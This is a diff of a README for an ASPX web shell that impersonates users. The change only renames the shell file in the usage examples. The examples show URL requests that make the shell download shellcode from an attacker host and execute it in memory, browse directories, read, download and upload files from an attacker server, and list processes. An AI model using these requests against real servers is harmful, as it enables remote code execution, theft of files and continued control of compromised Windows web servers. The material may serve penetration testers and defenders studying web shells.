@@ -20,29 +20,29 @@ In order to impersonate the user you want, in the source code you will have to e
 
 ### Download and Execute shellcode in memory
 ``
-https://url/sharp_impersonate.aspx?shellcodeUrl=https://attacker/shellcode.bin
+https://url/impersonate_bonanza.aspx?shellcodeUrl=https://attacker/shellcode.bin
 ``
 ### List directories
 ``
-https://url/sharp_impersonate.aspx?dir=C:\users\public
+https://url/impersonate_bonanza.aspx?dir=C:\users\public
 ``
 
 ### Download files
 ``
-https://url/sharp_impersonate.aspx?FileDownload=C:\users\public\FILE
+https://url/impersonate_bonanza.aspx?FileDownload=C:\users\public\FILE
 ``
 
 ### Upload files
 ``
-https://url/sharp_impersonate.aspx?UploadSource=https://attacker/FILE&UploadDestination=C:\users\public\FILE
+https://url/impersonate_bonanza.aspx?UploadSource=https://attacker/FILE&UploadDestination=C:\users\public\FILE
 ``
 
 ### Cat files
 ``
-https://url/sharp_impersonate.aspx?Cat=C:\users\public\FILE
+https://url/impersonate_bonanza.aspx?Cat=C:\users\public\FILE
 ``
 
 ### View processes
 ``
-https://url/sharp_impersonate.aspx?Process=1
+https://url/impersonate_bonanza.aspx?Process=1
 ``
